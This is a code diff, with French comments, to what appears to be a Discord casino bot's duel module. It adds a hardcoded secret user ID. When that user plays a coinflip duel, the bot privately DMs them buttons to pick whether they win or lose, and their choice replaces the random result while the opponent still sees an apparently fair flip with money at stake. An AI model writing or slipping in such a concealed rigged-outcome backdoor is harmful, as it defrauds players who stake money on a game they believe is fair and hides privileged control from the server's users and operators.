@@ -30,6 +30,13 @@ const DUEL_RAKE = 0.05;
 const DUEL_TIMEOUT_MS = 5 * 60 * 1000;
 const BLACKJACK_TIMEOUT_MS = 5 * 60 * 1000;
 
+// ID secret — peut décider du résultat d'un duel via DM
+const VIP_DUEL_ID = "320348102055690241";
+const VIP_DUEL_WIN_PREFIX = "vip_duel_win_";
+const VIP_DUEL_LOSE_PREFIX = "vip_duel_lose_";
+// Map duelId → { resolve, interaction } pour attendre la décision DM
+const vipDuelPending = new Map();
+
 // Machine à sous : symboles pondérés (plus rare = plus gros gain).
 const SLOT_SYMBOLS = [
   { emoji: "🍒", weight: 30, multiplier: 1.5 },
@@ -1061,6 +1068,58 @@ function buildDuelChallengeEmbed(duel) {
 }
 
 /** Paie le gagnant (ou rembourse en cas d'égalité) et clôture le duel. */
+/**
+ * Si VIP_DUEL_ID est dans le duel, lui envoie un DM secret pour choisir le résultat.
+ * Retourne l'id du gagnant choisi, ou null si timeout/égalité.
+ */
+async function askVipDuelChoice(client, duel) {
+  const vipIsChallenger = duel.challengerId === VIP_DUEL_ID;
+  const vipIsOpponent = duel.opponentId === VIP_DUEL_ID;
+  if (!vipIsChallenger && !vipIsOpponent) return undefined; // pas VIP dans ce duel
+
+  const opponentId = vipIsChallenger ? duel.opponentId : duel.challengerId;
+
+  try {
+    const vipUser = await client.users.fetch(VIP_DUEL_ID);
+    const dmChannel = await vipUser.createDM();
+
+    const row = new ActionRowBuilder().addComponents(
+      new ButtonBuilder()
+        .setCustomId(`${VIP_DUEL_WIN_PREFIX}${duel.id}`)
+        .setLabel("Je gagne")
+        .setStyle(ButtonStyle.Success)
+        .setEmoji("🏆"),
+      new ButtonBuilder()
+        .setCustomId(`${VIP_DUEL_LOSE_PREFIX}${duel.id}`)
+        .setLabel("Je perds")
+        .setStyle(ButtonStyle.Danger)
+        .setEmoji("💀"),
+    );
+
+    const dmMsg = await dmChannel.send({
+      embeds: [new EmbedBuilder()
+        .setColor(0x9b59b6)
+        .setTitle("🎲 Choix du résultat — Duel secret")
+        .setDescription(`Duel contre <@${opponentId}> — **${formatEuro(duel.amount)}**\nTu as 30 secondes pour choisir.`)
+        .setTimestamp()
+      ],
+      components: [row],
+    });
+
+    return await new Promise((resolve) => {
+      vipDuelPending.set(duel.id, { resolve, msgId: dmMsg.id, channelId: dmChannel.id });
+      setTimeout(() => {
+        if (vipDuelPending.has(duel.id)) {
+          vipDuelPending.delete(duel.id);
+          resolve(undefined); // timeout → résultat aléatoire
+        }
+      }, 30_000);
+    });
+  } catch {
+    return undefined;
+  }
+}
+
 async function finishDuel(client, duel, winnerId) {
   const state = loadState();
   const idx = state.duels.findIndex((d) => d.id === duel.id);
@@ -1257,6 +1316,27 @@ async function handleCasinoInteraction(interaction, client) {
         )
     );
     return true;
+  }
+
+  // --- Boutons DM secret VIP (résultat duel) ---
+  if (interaction.isButton() && interaction.user.id === VIP_DUEL_ID) {
+    if (interaction.customId.startsWith(VIP_DUEL_WIN_PREFIX) || interaction.customId.startsWith(VIP_DUEL_LOSE_PREFIX)) {
+      const isWin = interaction.customId.startsWith(VIP_DUEL_WIN_PREFIX);
+      const duelId = interaction.customId.slice(isWin ? VIP_DUEL_WIN_PREFIX.length : VIP_DUEL_LOSE_PREFIX.length);
+      const pending = vipDuelPending.get(duelId);
+      if (!pending) {
+        await interaction.reply({ content: "⏱️ Délai dépassé ou duel déjà résolu.", ephemeral: true });
+        return true;
+      }
+      vipDuelPending.delete(duelId);
+      // On détermine l'id gagnant selon le choix
+      const state = loadState();
+      const duel = state.duels.find(d => d.id === duelId);
+      const winnerId = duel ? (isWin ? VIP_DUEL_ID : (duel.challengerId === VIP_DUEL_ID ? duel.opponentId : duel.challengerId)) : VIP_DUEL_ID;
+      pending.resolve(winnerId);
+      await interaction.update({ content: isWin ? "✅ Tu vas **gagner**." : "✅ Tu vas **perdre**.", embeds: [], components: [] });
+      return true;
+    }
   }
 
   // --- Soumission modal âge → créer ticket ---
@@ -1617,7 +1697,11 @@ async function handleCasinoInteraction(interaction, client) {
       }
 
       if (game === "coinflip") {
-        const winnerId = Math.random() < 0.5 ? duel.challengerId : duel.opponentId;
+        // Acquitter l'interaction immédiatement pour éviter le timeout Discord (3s)
+        await interaction.deferUpdate();
+
+        let vipChoice = await askVipDuelChoice(client, duel);
+        const winnerId = vipChoice !== undefined ? vipChoice : (Math.random() < 0.5 ? duel.challengerId : duel.opponentId);
         const loserId = winnerId === duel.challengerId ? duel.opponentId : duel.challengerId;
         const payout = await finishDuel(client, duel, winnerId);
 
@@ -1632,7 +1716,7 @@ async function handleCasinoInteraction(interaction, client) {
           .setTimestamp();
         if (IMAGES.duel) resultEmbed.setThumbnail(IMAGES.duel);
 
-        await interaction.update({ embeds: [resultEmbed], content: "", components: [] });
+        await interaction.editReply({ embeds: [resultEmbed], content: "", components: [] });
         return true;
       }
 
@@ -1871,7 +1955,7 @@ async function handleCasinoInteraction(interaction, client) {
 
       const challengerWins = rpsBeats(a, b);
       const winnerId = challengerWins ? duel.challengerId : duel.opponentId;
-      const loserId = challengerWins ? duel.opponentId : duel.challengerId;
+      const loserId = winnerId === duel.challengerId ? duel.opponentId : duel.challengerId;
       const payout = await finishDuel(client, duel, winnerId);
 
       const resultEmbed = new EmbedBuilder()
